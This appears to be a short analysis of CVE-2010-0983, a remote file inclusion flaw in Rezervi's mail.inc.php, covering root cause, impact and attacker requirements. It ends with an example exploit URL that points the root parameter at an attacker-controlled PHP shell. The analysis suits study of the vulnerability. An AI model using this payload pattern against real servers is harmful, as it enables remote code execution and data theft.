Based on the provided information, here's an analysis of CVE-2010-0983:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability present in the `mail.inc.php` file of the Rezervi application.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application allows an attacker to include a remote file by manipulating the `root` parameter in the `mail.inc.php` file.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary code on the server hosting the Rezervi application. This can lead to complete compromise of the server.
- **Data Theft/Manipulation:** Attackers could potentially gain access to sensitive data or manipulate application data.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector is through a crafted HTTP GET request to the vulnerable `mail.inc.php` file, including a `root` parameter pointing to a malicious remote file.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker must have network access to the server hosting the Rezervi application.
- **Malicious File Hosting:** The attacker needs to host a malicious PHP file on a server accessible to the vulnerable application.

**Summary of Exploit:**
The attacker crafts a URL pointing to `mail.inc.php` with the `root` parameter set to the URL of a malicious PHP file. The vulnerable application includes and executes this file, leading to arbitrary code execution.

**Example Exploit URL:**
`[r00t.h4x0r]/include/mail.inc.php?root=[Shell]`
Where `[Shell]` is replaced with the URL of attacker's controlled php shell.
